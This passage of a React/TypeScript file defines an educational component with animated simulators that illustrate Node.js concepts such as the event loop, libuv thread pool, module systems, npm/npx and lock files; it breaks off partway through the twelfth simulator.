import React, { useState, useEffect, useRef } from "react";
import { Play, RotateCcw, AlertCircle, CheckCircle2, Shield, ShieldCheck, Database, Server, RefreshCw, Cpu, Activity, User, FileText, Lock, Send, Key, Layers, Wifi, Trash2, Sliders } from "lucide-react";

interface InteractiveDiagramProps {
  questionId: number;
  visualLabel: string;
}

export default function InteractiveDiagram({ questionId, visualLabel }: InteractiveDiagramProps) {
  // Common states used across various simulators to keep them responsive
  const [logs, setLogs] = useState<string[]>([]);
  const [isPlaying, setIsPlaying] = useState(false);
  const [step, setStep] = useState(0);
  const [inputVal, setInputVal] = useState("");
  const [activeTab, setActiveTab] = useState("A");
  const [config, setConfig] = useState<any>({});
  
  // Clean up states when question changes
  useEffect(() => {
    setLogs([`Initialized ${visualLabel} simulator.`]);
    setIsPlaying(false);
    setStep(0);
    setInputVal("");
    setActiveTab("A");
    setConfig({});
  }, [questionId, visualLabel]);

  const addLog = (msg: string) => {
    setLogs((prev) => [...prev, `[${new Date().toLocaleTimeString()}] ${msg}`].slice(-8));
  };

  const clearLogs = () => {
    setLogs([`Console cleared.`]);
  };

  // Render a mock terminal output
  const renderTerminal = () => (
    <div className="mt-4 bg-[#f4f4f5] rounded p-3.5 border border-[#27272a] font-mono text-xs text-[#18181b] shadow-inner h-36 overflow-y-auto">
      <div className="flex items-center justify-between border-b border-[#2D2D2D] pb-2 mb-2 text-[#71717a] text-[9px] uppercase tracking-wider font-semibold">
        <span>STDOUT / Interactive Terminal Sandbox</span>
        <button onClick={clearLogs} className="hover:text-[#09090b] transition-colors font-mono">
          [Clear stdout]
        </button>
      </div>
      {logs.map((log, index) => (
        <div key={index} className="leading-5">
          <span className="text-[#71717a] mr-2 font-mono">&gt;</span>
          {log}
        </div>
      ))}
    </div>
  );

  const simulatorProps = {
    logs, setLogs, isPlaying, setIsPlaying, step, setStep,
    inputVal, setInputVal, activeTab, setActiveTab, config, setConfig,
    addLog, clearLogs, renderTerminal
  };

  const getSimulator = () => {
    switch (questionId) {
      case 1: return <Simulator1 {...simulatorProps} />;
      case 2: return <Simulator2 {...simulatorProps} />;
      case 3: return <Simulator3 {...simulatorProps} />;
      case 4: return <Simulator4 {...simulatorProps} />;
      case 5: return <Simulator5 {...simulatorProps} />;
      case 6: return <Simulator6 {...simulatorProps} />;
      case 7: return <Simulator7 {...simulatorProps} />;
      case 8: return <Simulator8 {...simulatorProps} />;
      case 9: return <Simulator9 {...simulatorProps} />;
      case 10: return <Simulator10 {...simulatorProps} />;
      case 11: return <Simulator11 {...simulatorProps} />;
      case 12: return <Simulator12 {...simulatorProps} />;
      case 13: return <Simulator13 {...simulatorProps} />;
      case 14: return <Simulator14 {...simulatorProps} />;
      case 15: return <Simulator15 {...simulatorProps} />;
      case 16: return <Simulator16 {...simulatorProps} />;
      case 17: return <Simulator17 {...simulatorProps} />;
      case 18: return <Simulator18 {...simulatorProps} />;
      case 19: return <Simulator19 {...simulatorProps} />;
      case 20: return <Simulator20 {...simulatorProps} />;
      case 21: return <Simulator21 {...simulatorProps} />;
      case 22: return <Simulator22 {...simulatorProps} />;
      case 23: return <Simulator23 {...simulatorProps} />;
      case 24: return <Simulator24 {...simulatorProps} />;
      case 25: return <Simulator25 {...simulatorProps} />;
      case 26: return <Simulator26 {...simulatorProps} />;
      case 27: return <Simulator27 {...simulatorProps} />;
      case 28: return <Simulator28 {...simulatorProps} />;
      case 29: return <Simulator29 {...simulatorProps} />;
      case 30: return <Simulator30 {...simulatorProps} />;
      case 31: return <Simulator31 {...simulatorProps} />;
      case 32: return <Simulator32 {...simulatorProps} />;
      case 33: return <Simulator33 {...simulatorProps} />;
      case 34: return <Simulator34 {...simulatorProps} />;
      case 35: return <Simulator35 {...simulatorProps} />;
      case 36: return <Simulator36 {...simulatorProps} />;
      case 37: return <Simulator37 {...simulatorProps} />;
      case 38: return <Simulator38 {...simulatorProps} />;
      case 39: return <Simulator39 {...simulatorProps} />;
      case 40: return <Simulator40 {...simulatorProps} />;
      default:
        return (
          <div className="p-4 text-center text-slate-500 text-xs">
            Interactive diagram coming soon for question {questionId}!
          </div>
        );
    }
  };

  return (
    <div className="bg-zinc-950 rounded p-4 border border-[#27272a]">
      <div className="flex items-center gap-2 mb-4 border-b border-[#27272a] pb-2">
        <span className="w-1.5 h-1.5 bg-[#f4f4f5] rounded-full"></span>
        <h3 className="text-[10px] font-mono font-bold uppercase tracking-widest text-[#71717a]">
          {visualLabel || "Interactive Concept Diagram"}
        </h3>
      </div>
      {getSimulator()}
    </div>
  );
}


// ----------------------------------------------------
  // INDIVIDUAL SIMULATORS FOR EACH OF THE 40 CONCEPTS
  // ----------------------------------------------------

  // 1. What is Node.js? (V8 + Libuv sandbox)
  const Simulator1 = ({ logs, setLogs, isPlaying, setIsPlaying, step, setStep, inputVal, setInputVal, activeTab, setActiveTab, config, setConfig, addLog, clearLogs, renderTerminal, ...props }: any) => {
    const handleRun = () => {
      setIsPlaying(true);
      clearLogs();
      addLog("Executing script: node server.js");
      addLog("V8: Parsing JavaScript syntax tree...");
      
      setTimeout(() => {
        addLog("V8: Compiling to native machine code...");
        setStep(1);
      }, 800);

      setTimeout(() => {
        addLog("Runtime: Async I/O triggered -> Delegating to Libuv...");
        setStep(2);
      }, 1600);

      setTimeout(() => {
        addLog("Libuv: OS operation completes, pushing callback to loop queue...");
        setStep(3);
      }, 2600);

      setTimeout(() => {
        addLog("Event Loop: Pushing callback back to V8 Call Stack!");
        addLog("STDOUT: 'Done! Server reading completed. Code 200'");
        setIsPlaying(false);
        setStep(4);
      }, 3600);
    };

    return (
      <div className="space-y-4">
        <div className="grid grid-cols-3 gap-3">
          <div className={`p-3 rounded-lg border text-center transition-all ${step === 1 ? "bg-cyan-950/40 border-cyan-500 scale-105" : "bg-slate-900 border-slate-800"}`}>
            <Cpu className="mx-auto mb-1 text-cyan-400" size={24} />
            <h4 className="text-xs font-semibold">1. V8 Engine</h4>
            <p className="text-[10px] text-slate-400 mt-1">Parses & compiles JS</p>
          </div>
          <div className={`p-3 rounded-lg border text-center transition-all ${step === 2 || step === 3 ? "bg-cyan-950/40 border-cyan-500 scale-105" : "bg-slate-900 border-slate-800"}`}>
            <Activity className="mx-auto mb-1 text-cyan-400" size={24} />
            <h4 className="text-xs font-semibold">2. Libuv (C++)</h4>
            <p className="text-[10px] text-slate-400 mt-1">Async Threadpool / I/O</p>
          </div>
          <div className={`p-3 rounded-lg border text-center transition-all ${step === 4 ? "bg-emerald-950/40 border-emerald-500 scale-105" : "bg-slate-900 border-slate-800"}`}>
            <Server className="mx-auto mb-1 text-emerald-400" size={24} />
            <h4 className="text-xs font-semibold">3. OS/Hardware</h4>
            <p className="text-[10px] text-slate-400 mt-1">Sockets, files, epoll</p>
          </div>
        </div>

        <div className="flex justify-center">
          <button
            disabled={isPlaying}
            onClick={handleRun}
            className="flex items-center gap-2 bg-emerald-600 hover:bg-emerald-500 text-white font-medium text-xs px-4 py-2 rounded-lg transition-colors disabled:bg-slate-800"
          >
            <Play size={14} />
            {isPlaying ? "Running..." : "Execute Script"}
          </button>
        </div>
        {renderTerminal()}
      </div>
    );
  };

  // 2. Is Node.js single-threaded?
  const Simulator2 = ({ logs, setLogs, isPlaying, setIsPlaying, step, setStep, inputVal, setInputVal, activeTab, setActiveTab, config, setConfig, addLog, clearLogs, renderTerminal, ...props }: any) => {
    const [blocked, setBlocked] = useState(false);
    const [threads, setThreads] = useState(["idle", "idle", "idle", "idle"]);

    const runAsyncCrypto = () => {
      addLog("Main Thread: Offloaded pbkdf2 cryptography to Libuv thread pool.");
      
      // Select an idle thread to process the task
      setThreads((prev) => {
        const next = [...prev];
        const idleIdx = next.findIndex((t) => t === "idle");
        if (idleIdx !== -1) {
          next[idleIdx] = "busy";
        }
        return next;
      });

      setTimeout(() => {
        addLog("Libuv worker thread completed hashing.");
        setThreads((prev) => {
          const next = [...prev];
          const busyIdx = next.findIndex((t) => t === "busy");
          if (busyIdx !== -1) {
            next[busyIdx] = "idle";
          }
          return next;
        });
        addLog("Event Loop: Hash callback returned to Main Thread successfully.");
      }, 2000);
    };

    const runSyncLoop = () => {
      setBlocked(true);
      addLog("WARNING: Running infinite while() loop on Main Thread!");
      addLog("CRITICAL: MAIN THREAD BLOCKED. No other operations can run!");
      
      setTimeout(() => {
        setBlocked(false);
        addLog("Main Thread: Finally escaped infinite loop. System active.");
      }, 4000);
    };

    return (
      <div className="space-y-4">
        <div className="grid grid-cols-2 gap-4">
          <div className={`p-3 rounded-lg border relative ${blocked ? "border-rose-500 bg-rose-950/20" : "border-emerald-500 bg-emerald-950/10"}`}>
            <div className="absolute top-2 right-2 flex items-center gap-1.5">
              <span className={`h-2.5 w-2.5 rounded-full ${blocked ? "bg-rose-500 animate-ping" : "bg-emerald-400"}`}></span>
              <span className="text-[10px] text-slate-400">{blocked ? "BLOCKED" : "LIVE"}</span>
            </div>
            <h4 className="text-xs font-semibold mb-2">V8 Main Thread (1x)</h4>
            <p className="text-[11px] text-slate-300">Executes all synchronous JS. Must never be blocked!</p>
            <div className="mt-3 flex gap-2">
              <button onClick={runSyncLoop} disabled={blocked} className="w-full bg-rose-900/60 hover:bg-rose-800 text-rose-200 text-[10px] py-1.5 px-2 rounded border border-rose-700">
                Block Thread (Sync)
              </button>
            </div>
          </div>

          <div className="p-3 rounded-lg border border-slate-800 bg-slate-900">
            <h4 className="text-xs font-semibold mb-2">Libuv Thread Pool (4x)</h4>
            <div className="grid grid-cols-2 gap-2">
              {threads.map((status, idx) => (
                <div key={idx} className={`p-1.5 rounded text-center border text-[10px] ${status === "busy" ? "bg-cyan-950 border-cyan-500 text-cyan-300 animate-pulse" : "bg-slate-950 border-slate-800 text-slate-500"}`}>
                  Thread {idx + 1}: {status.toUpperCase()}
                </div>
              ))}
            </div>
            <button onClick={runAsyncCrypto} disabled={blocked} className="w-full mt-3 bg-cyan-600 hover:bg-cyan-500 text-white text-[10px] py-1.5 px-2 rounded">
              Run Async Task (Offload)
            </button>
          </div>
        </div>
        {renderTerminal()}
      </div>
    );
  };

  // 3. What is the event loop?
  const Simulator3 = ({ logs, setLogs, isPlaying, setIsPlaying, step, setStep, inputVal, setInputVal, activeTab, setActiveTab, config, setConfig, addLog, clearLogs, renderTerminal, ...props }: any) => {
    const [loopPhase, setLoopPhase] = useState(0);
    const phases = ["TIMERS", "POLL (I/O)", "CHECK", "CLOSE"];

    useEffect(() => {
      if (!isPlaying) return;
      const interval = setInterval(() => {
        setLoopPhase((prev) => {
          const next = (prev + 1) % phases.length;
          addLog(`Loop advancing to phase: ${phases[next]}`);
          return next;
        });
      }, 1500);
      return () => clearInterval(interval);
    }, [isPlaying]);

    return (
      <div className="space-y-4">
        <div className="flex justify-center py-4">
          <div className="relative w-44 h-44 rounded-full border-4 border-dashed border-slate-700 flex items-center justify-center animate-[spin_40s_linear_infinite]">
            <div className="absolute inset-2 rounded-full border border-slate-800 flex items-center justify-center bg-slate-950">
              <div className="text-center rotate-0">
                <span className="text-[10px] text-slate-500 block uppercase font-mono">Current Phase</span>
                <span className="text-sm font-bold text-cyan-400 font-mono tracking-tight">{phases[loopPhase]}</span>
              </div>
            </div>
            {/* Visual node ticks representing event loop check points */}
            <div className={`absolute top-0 p-1.5 rounded bg-slate-900 border text-[9px] font-mono ${loopPhase === 0 ? "border-cyan-500 text-cyan-400 scale-110" : "border-slate-800 text-slate-400"}`}>Timers</div>
            <div className={`absolute right-0 p-1.5 rounded bg-slate-900 border text-[9px] font-mono ${loopPhase === 1 ? "border-cyan-500 text-cyan-400 scale-110" : "border-slate-800 text-slate-400"}`}>Poll</div>
            <div className={`absolute bottom-0 p-1.5 rounded bg-slate-900 border text-[9px] font-mono ${loopPhase === 2 ? "border-cyan-500 text-cyan-400 scale-110" : "border-slate-800 text-slate-400"}`}>Check</div>
            <div className={`absolute left-0 p-1.5 rounded bg-slate-900 border text-[9px] font-mono ${loopPhase === 3 ? "border-rose-500 text-rose-400 scale-110" : "border-slate-800 text-slate-400"}`}>Close</div>
          </div>
        </div>

        <div className="flex justify-center gap-2">
          <button
            onClick={() => {
              setIsPlaying(!isPlaying);
              addLog(isPlaying ? "Paused event loop." : "Started event loop daemon.");
            }}
            className={`px-4 py-2 rounded-lg text-xs font-medium text-white transition-colors ${isPlaying ? "bg-rose-600 hover:bg-rose-500" : "bg-emerald-600 hover:bg-emerald-500"}`}
          >
            {isPlaying ? "Pause Event Loop" : "Start Continuous Loop"}
          </button>
        </div>
        {renderTerminal()}
      </div>
    );
  };

  // 4. What are the phases of the event loop?
  const Simulator4 = ({ logs, setLogs, isPlaying, setIsPlaying, step, setStep, inputVal, setInputVal, activeTab, setActiveTab, config, setConfig, addLog, clearLogs, renderTerminal, ...props }: any) => {
    const [queue, setQueue] = useState<{ name: string; phase: number }[]>([]);
    const [activeIdx, setActiveIdx] = useState(0);

    const phasesDetailed = [
      { id: 0, name: "Timers", desc: "setTimeout/setInterval" },
      { id: 1, name: "Pending Callbacks", desc: "Deferred OS exceptions" },
      { id: 2, name: "Poll (I/O)", desc: "Retrieve events and trigger file/net callbacks" },
      { id: 3, name: "Check", desc: "setImmediate callbacks" },
      { id: 4, name: "Close Callbacks", desc: "socket.on('close')" }
    ];

    const enqueueTask = (name: string, phase: number) => {
      setQueue((prev) => [...prev, { name, phase }]);
      addLog(`Added callback to [${phasesDetailed[phase].name}] queue: ${name}`);
    };

    const stepPhase = () => {
      const currentPhase = activeIdx;
      const tasksInPhase = queue.filter((t) => t.phase === currentPhase);
      
      if (tasksInPhase.length > 0) {
        tasksInPhase.forEach((t) => {
          addLog(`Executing callback from ${phasesDetailed[currentPhase].name} phase: ${t.name}`);
        });
        setQueue((prev) => prev.filter((t) => t.phase !== currentPhase));
      } else {
        addLog(`Phase [${phasesDetailed[currentPhase].name}] has empty queue. Moving on...`);
      }

      setActiveIdx((prev) => (prev + 1) % phasesDetailed.length);
    };

    return (
      <div className="space-y-4">
        <div className="flex justify-between items-center bg-slate-900 p-2 rounded-lg border border-slate-800">
          <div className="flex gap-1">
            <button onClick={() => enqueueTask("setTimeout(() => {}, 100)", 0)} className="bg-cyan-950 hover:bg-cyan-900 border border-cyan-800 text-cyan-300 text-[10px] px-2 py-1 rounded">
              + Timeout
            </button>
            <button onClick={() => enqueueTask("fs.readFile callback", 2)} className="bg-cyan-950 hover:bg-cyan-900 border border-cyan-800 text-cyan-300 text-[10px] px-2 py-1 rounded">
              + File I/O
            </button>
            <button onClick={() => enqueueTask("setImmediate()", 3)} className="bg-cyan-950 hover:bg-cyan-900 border border-cyan-800 text-cyan-300 text-[10px] px-2 py-1 rounded">
              + Immediate
            </button>
          </div>
          <button onClick={stepPhase} className="bg-emerald-600 hover:bg-emerald-500 text-white font-semibold text-[11px] px-3 py-1.5 rounded flex items-center gap-1">
            <RefreshCw size={12} /> Step Phase
          </button>
        </div>

        <div className="space-y-2">
          {phasesDetailed.map((p, idx) => {
            const count = queue.filter((t) => t.phase === idx).length;
            const isActive = activeIdx === idx;
            return (
              <div key={p.id} className={`p-2.5 rounded-lg border transition-all flex justify-between items-center ${isActive ? "bg-slate-800 border-emerald-500 scale-[1.01]" : "bg-slate-900/60 border-slate-800"}`}>
                <div className="flex items-center gap-2">
                  <span className={`h-2 w-2 rounded-full ${isActive ? "bg-emerald-400 animate-ping" : "bg-slate-600"}`}></span>
                  <div>
                    <h5 className={`text-xs font-bold ${isActive ? "text-emerald-400" : "text-slate-300"}`}>{p.name}</h5>
                    <p className="text-[10px] text-slate-500">{p.desc}</p>
                  </div>
                </div>
                <div className="flex items-center gap-2">
                  <span className={`text-[10px] px-2 py-0.5 rounded-full font-mono ${count > 0 ? "bg-cyan-950 text-cyan-400 border border-cyan-800" : "bg-slate-950 text-slate-600"}`}>
                    {count} callback{count !== 1 ? "s" : ""}
                  </span>
                </div>
              </div>
            );
          })}
        </div>
        {renderTerminal()}
      </div>
    );
  };

  // 5. process.nextTick() vs setImmediate()
  const Simulator5 = ({ logs, setLogs, isPlaying, setIsPlaying, step, setStep, inputVal, setInputVal, activeTab, setActiveTab, config, setConfig, addLog, clearLogs, renderTerminal, ...props }: any) => {
    const runOrderSimulation = () => {
      clearLogs();
      addLog("Starting standard Node execution block...");
      addLog("Call Stack: Running console.log('1. Synchronous Code')");
      
      addLog("Scheduling nextTick queue callback...");
      addLog("Scheduling setImmediate check queue callback...");
      addLog("Scheduling setTimeout timers queue callback...");

      setTimeout(() => {
        addLog("--- SWEEPING MICROTASK QUEUES FIRST ---");
        addLog("Stdout: '2. process.nextTick() Callback' (Executed before loop ticks!)");
      }, 1000);

      setTimeout(() => {
        addLog("--- MOVING TO EVENT LOOP MACROTASK QUEUES ---");
        addLog("Stdout: '3. setTimeout() Callback' (Timers Phase)");
      }, 2000);

      setTimeout(() => {
        addLog("Stdout: '4. setImmediate() Callback' (Check Phase - after Timers/I/O)");
        addLog("Timeline Simulation completed.");
      }, 3000);
    };

    return (
      <div className="space-y-4">
        <div className="border border-slate-800 bg-slate-900 rounded-lg p-3">
          <h4 className="text-xs font-semibold mb-3 text-slate-300">Queue Processing Order</h4>
          <div className="flex items-center gap-2 text-xs text-slate-400 font-mono">
            <div className="bg-rose-950/40 border border-rose-800 text-rose-300 px-2 py-1 rounded">1. Main Stack</div>
            <span>&rarr;</span>
            <div className="bg-cyan-950/40 border border-cyan-800 text-cyan-300 px-2 py-1 rounded">2. nextTick (Micro)</div>
            <span>&rarr;</span>
            <div className="bg-cyan-950/40 border border-cyan-800 text-cyan-300 px-2 py-1 rounded">3. Timers (Macro)</div>
            <span>&rarr;</span>
            <div className="bg-cyan-950/40 border border-cyan-800 text-cyan-300 px-2 py-1 rounded">4. setImmediate</div>
          </div>
        </div>

        <div className="flex justify-center">
          <button onClick={runOrderSimulation} className="bg-emerald-600 hover:bg-emerald-500 text-white font-medium text-xs px-4 py-2 rounded-lg flex items-center gap-1">
            <Play size={14} /> Animate Processing Order
          </button>
        </div>
        {renderTerminal()}
      </div>
    );
  };

  // 6. Callback vs Promise vs Async/Await
  const Simulator6 = ({ logs, setLogs, isPlaying, setIsPlaying, step, setStep, inputVal, setInputVal, activeTab, setActiveTab, config, setConfig, addLog, clearLogs, renderTerminal, ...props }: any) => {
    return (
      <div className="space-y-4">
        <div className="flex border-b border-slate-800 pb-2">
          {["Callback", "Promise", "Async/Await"].map((type) => (
            <button
              key={type}
              onClick={() => {
                setActiveTab(type);
                clearLogs();
                addLog(`Switched format code illustration to ${type}.`);
              }}
              className={`flex-1 text-center py-1.5 text-xs font-semibold rounded-t-lg transition-all ${activeTab === type ? "bg-slate-800 text-emerald-400 border-b-2 border-emerald-500" : "text-slate-400 hover:text-slate-300"}`}
            >
              {type}
            </button>
          ))}
        </div>

        <div className="bg-slate-900/60 p-3 rounded-lg border border-slate-800 text-xs font-mono space-y-1">
          {activeTab === "Callback" && (
            <>
              <div className="text-emerald-500">// Callback sequence</div>
              <div>fetchUser(id, <span className="text-cyan-400">(err, user) =&gt;</span> &#123;</div>
              <div className="pl-4">if (err) return handle(err);</div>
              <div className="pl-4">fetchCart(user.id, <span className="text-cyan-400">(err, cart) =&gt;</span> &#123;</div>
              <div className="pl-8">console.log(cart);</div>
              <div className="pl-4">&#125;);</div>
              <div>&#125;);</div>
            </>
          )}

          {activeTab === "Promise" && (
            <>
              <div className="text-emerald-500">// Promise Chaining</div>
              <div>fetchUser(id)</div>
              <div className="pl-4">.then(<span className="text-cyan-400">user =&gt;</span> fetchCart(user.id))</div>
              <div className="pl-4">.then(<span className="text-cyan-400">cart =&gt;</span> console.log(cart))</div>
              <div className="pl-4">.catch(<span className="text-rose-400">err =&gt;</span> handle(err));</div>
            </>
          )}

          {activeTab === "Async/Await" && (
            <>
              <div className="text-emerald-500">// Async/Await syntactic sugar</div>
              <div>async function run() &#123;</div>
              <div className="pl-4">try &#123;</div>
              <div className="pl-8">const <span className="text-cyan-400">user</span> = await fetchUser(id);</div>
              <div className="pl-8">const <span className="text-cyan-400">cart</span> = await fetchCart(user.id);</div>
              <div className="pl-8">console.log(cart);</div>
              <div className="pl-4">&#125; catch (<span className="text-rose-400">err</span>) &#123;</div>
              <div className="pl-8">handle(err);</div>
              <div className="pl-4">&#125;</div>
              <div>&#125;</div>
            </>
          )}
        </div>

        <button
          onClick={() => {
            clearLogs();
            addLog(`Simulating sequential requests using ${activeTab} patterns...`);
            setTimeout(() => addLog("Database request 1 sent..."), 600);
            setTimeout(() => addLog("Database response received, proceeding to request 2..."), 1500);
            setTimeout(() => addLog("Request 2 complete. Payload output to console."), 2400);
          }}
          className="w-full bg-slate-950 hover:bg-slate-900 text-slate-300 font-semibold border border-slate-800 py-2 rounded text-xs transition-colors"
        >
          Animate Lifecycle Flow
        </button>
        {renderTerminal()}
      </div>
    );
  };

  // 7. Callback Hell
  const Simulator7 = ({ logs, setLogs, isPlaying, setIsPlaying, step, setStep, inputVal, setInputVal, activeTab, setActiveTab, config, setConfig, addLog, clearLogs, renderTerminal, ...props }: any) => {
    return (
      <div className="space-y-4">
        <div className="grid grid-cols-2 gap-4">
          <div className="p-3 bg-rose-950/20 border border-rose-900 rounded-lg text-center">
            <h4 className="text-xs font-bold text-rose-300 mb-1">❌ Callback Hell</h4>
            <p className="text-[10px] text-slate-400 mb-2">Deep pyramids, hard debugging</p>
            <div className="text-[9px] font-mono bg-slate-950 p-2 rounded text-left leading-4 h-28 overflow-hidden text-rose-400/80">
              {`doA((a) => {
  doB(a, (b) => {
    doC(b, (c) => {
      doD(c, (d) => {
        // Nesting Hell!
      });
    });
  });
});`}
            </div>
          </div>

          <div className="p-3 bg-emerald-950/20 border border-emerald-900 rounded-lg text-center">
            <h4 className="text-xs font-bold text-emerald-300 mb-1">✅ Flattened Async</h4>
            <p className="text-[10px] text-slate-400 mb-2">Clean vertical readability</p>
            <div className="text-[9px] font-mono bg-slate-950 p-2 rounded text-left leading-4 h-28 overflow-hidden text-emerald-400/80">
              {`try {
  const a = await doA();
  const b = await doB(a);
  const c = await doC(b);
  const d = await doD(c);
} catch (err) {
  // Central handler
}`}
            </div>
          </div>
        </div>
        <button
          onClick={() => {
            clearLogs();
            addLog("Executing comparative benchmark...");
            addLog("Callback Hell error stack trace: line 4 inside callback of callback...");
            addLog("Refactored code logs: uniform try-catch caught exception beautifully!");
          }}
          className="w-full bg-emerald-600 hover:bg-emerald-500 text-white font-medium text-xs py-2 rounded transition-colors"
        >
          Compare Stack Traces
        </button>
        {renderTerminal()}
      </div>
    );
  };

  // 8. require vs import
  const Simulator8 = ({ logs, setLogs, isPlaying, setIsPlaying, step, setStep, inputVal, setInputVal, activeTab, setActiveTab, config, setConfig, addLog, clearLogs, renderTerminal, ...props }: any) => {
    return (
      <div className="space-y-4">
        <div className="grid grid-cols-2 gap-4">
          <div className="p-3 rounded-lg border border-slate-800 bg-slate-900">
            <span className="text-[9px] font-mono bg-cyan-950 border border-cyan-800 text-cyan-400 px-1.5 py-0.5 rounded">CommonJS</span>
            <h4 className="text-xs font-bold mt-2">require()</h4>
            <ul className="text-[10px] text-slate-400 mt-2 space-y-1 list-disc pl-4">
              <li>Synchronous runtime loading</li>
              <li>Can be placed inside if-blocks</li>
              <li>Legacy Node default format</li>
            </ul>
          </div>

          <div className="p-3 rounded-lg border border-slate-800 bg-slate-900">
            <span className="text-[9px] font-mono bg-cyan-950 border border-cyan-800 text-cyan-400 px-1.5 py-0.5 rounded">ES Modules</span>
            <h4 className="text-xs font-bold mt-2">import / export</h4>
            <ul className="text-[10px] text-slate-400 mt-2 space-y-1 list-disc pl-4">
              <li>Asynchronous build analysis</li>
              <li>Must sit at top-level scope</li>
              <li>Enables Tree-Shaking optimization</li>
            </ul>
          </div>
        </div>
        <button
          onClick={() => {
            clearLogs();
            addLog("Simulating ESM Tree-Shaking process...");
            addLog("Analyzing code: 'import { active } from \"./lib\"' (omitting 5 unused functions)");
            addLog("Result: Bundler strips unused functions. Bundle size reduced by 40%!");
          }}
          className="w-full bg-cyan-600 hover:bg-cyan-500 text-white font-medium text-xs py-2 rounded transition-colors"
        >
          Animate Tree-Shaking Build
        </button>
        {renderTerminal()}
      </div>
    );
  };

  // 9. npm vs npx
  const Simulator9 = ({ logs, setLogs, isPlaying, setIsPlaying, step, setStep, inputVal, setInputVal, activeTab, setActiveTab, config, setConfig, addLog, clearLogs, renderTerminal, ...props }: any) => {
    return (
      <div className="space-y-4">
        <div className="grid grid-cols-2 gap-3">
          <button
            onClick={() => {
              clearLogs();
              addLog("$ npm install cowsay");
              addLog("Fetching registry packages metadata...");
              addLog("Added 12 dependencies into package.json");
              addLog("Downloaded cowsay package successfully into local node_modules/");
            }}
            className="p-3 rounded-lg border border-slate-800 bg-slate-900 hover:border-emerald-500 transition-all text-left"
          >
            <h5 className="text-xs font-bold text-slate-200">Run npm install</h5>
            <p className="text-[10px] text-slate-500 mt-1">Saves package permanently to node_modules disk folder.</p>
          </button>

          <button
            onClick={() => {
              clearLogs();
              addLog("$ npx cowsay 'Hello, Node!'");
              addLog("npx: Temporary cache folder initialized.");
              addLog("Downloading cowsay binary...");
              addLog("Executing transient command:");
              addLog(" __________________");
              addLog("< Hello, Node! >");
              addLog(" ------------------");
              addLog("        \\   ^__^");
              addLog("         \\  (oo)\\_______");
              addLog("            (__)\\       )\\/\\");
              addLog("                ||----w |");
              addLog("                ||     ||");
              addLog("Wiping transient cache. Clean disk slate.");
            }}
            className="p-3 rounded-lg border border-slate-800 bg-slate-900 hover:border-cyan-500 transition-all text-left"
          >
            <h5 className="text-xs font-bold text-slate-200">Run npx cowsay</h5>
            <p className="text-[10px] text-slate-500 mt-1">Fetches, runs instantly without permanent disk footprint.</p>
          </button>
        </div>
        {renderTerminal()}
      </div>
    );
  };

  // 10. package.json
  const Simulator10 = ({ logs, setLogs, isPlaying, setIsPlaying, step, setStep, inputVal, setInputVal, activeTab, setActiveTab, config, setConfig, addLog, clearLogs, renderTerminal, ...props }: any) => {
    const [selectedKey, setSelectedKey] = useState<string | null>(null);

    const keys = {
      scripts: "Configures executable console shortcut aliases (eg: npm run dev starts the dev command sequence).",
      dependencies: "Third-party libraries vital to running production code. Saved via npm install.",
      devDependencies: "Local assets or linters required during code compilation. Saved via npm install --save-dev.",
      type: "module: mandates ES Modules file parsing rather than standard legacy CommonJS require."
    };

    return (
      <div className="space-y-4">
        <div className="bg-slate-950 p-3 rounded-lg border border-slate-800 font-mono text-xs text-slate-300">
          <div>&#123;</div>
          <div className="pl-4">"name": "my-app",</div>
          <div className="pl-4 hover:bg-slate-800/80 cursor-pointer rounded px-1 transition-colors" onClick={() => { setSelectedKey("type"); addLog("Checked 'type' descriptor."); }}>
            <span className="text-cyan-400">"type"</span>: <span className="text-emerald-400">"module"</span>, <span className="text-[10px] text-slate-500">// click to inspect</span>
          </div>
          <div className="pl-4 hover:bg-slate-800/80 cursor-pointer rounded px-1 transition-colors" onClick={() => { setSelectedKey("scripts"); addLog("Checked 'scripts' descriptor."); }}>
            <span className="text-cyan-400">"scripts"</span>: &#123; <span className="text-emerald-400">"start": "node server.js"</span> &#125;,
          </div>
          <div className="pl-4 hover:bg-slate-800/80 cursor-pointer rounded px-1 transition-colors" onClick={() => { setSelectedKey("dependencies"); addLog("Checked 'dependencies' descriptor."); }}>
            <span className="text-cyan-400">"dependencies"</span>: &#123; <span className="text-emerald-400">"express": "^4.21.0"</span> &#125;
          </div>
          <div>&#125;</div>
        </div>

        {selectedKey && (
          <div className="p-3 rounded-lg border border-emerald-900 bg-emerald-950/20 text-xs text-emerald-200">
            <strong className="capitalize">{selectedKey} description:</strong> {keys[selectedKey as keyof typeof keys]}
          </div>
        )}
        {renderTerminal()}
      </div>
    );
  };

  // 11. package-lock.json
  const Simulator11 = ({ logs, setLogs, isPlaying, setIsPlaying, step, setStep, inputVal, setInputVal, activeTab, setActiveTab, config, setConfig, addLog, clearLogs, renderTerminal, ...props }: any) => {
    const [useLock, setUseLock] = useState(true);

    const handleDeploy = () => {
      clearLogs();
      addLog("Starting server deployment build pipelines...");
      addLog("Running: npm ci (clean inspect install)...");
      
      if (useLock) {
        setTimeout(() => {
          addLog("Success: package-lock.json matched cache files exactly!");
          addLog("Build outcome: Successfully deployed identical version v1.2.4 across cluster nodes.");
        }, 1200);
      } else {
        setTimeout(() => {
          addLog("Warning: Missing lock file. Re-fetching fresh unpinned dependencies tree...");
          addLog("Error: Nested dependency 'http-errors' was updated 3 minutes ago with breaking API changes!");
          addLog("Deployment Status: FAILED. App crashes on boot due to out-of-sync nested dependency versions!");
        }, 1500);
      }
    };

    return (
      <div className="space-y-4">
        <div className="flex items-center justify-between bg-slate-900 p-3 rounded-lg border border-slate-800">
          <span className="text-xs font-semibold">Lock File Determinism Mode:</span>
          <button
            onClick={() => setUseLock(!useLock)}
            className={`px-3 py-1.5 rounded-md text-xs font-semibold ${useLock ? "bg-emerald-600 text-white" : "bg-rose-950 border border-rose-800 text-rose-300"}`}
          >
            {useLock ? "🔒 package-lock.json ON" : "⚠️ NO lock file (Loose Install)"}
          </button>
        </div>

        <button onClick={handleDeploy} className="w-full bg-cyan-600 hover:bg-cyan-500 text-white font-medium text-xs py-2 rounded">
          Trigger Deployment Simulation
        </button>
        {renderTerminal()}
      </div>
    );
  };

  // 12. What is a Node.js stream? (Memory visualization)
  const Simulator12 = ({ logs, setLogs, isPlaying, setIsPlaying, step, setStep, inputVal, setInputVal, activeTab, setActiveTab, config, setConfig, addLog, clearLogs, renderTerminal, ...props }: any) => {
    const [streamMode, setStreamMode] = useState(true);
    const [ramUsage, setRamUsage] = useState(0);

    const triggerUpload = () => {
      clearLogs();
      addLog(`Initiating upload of 500MB raw media file in ${streamMode ? "Stream" : "Buffer"} mode...`);
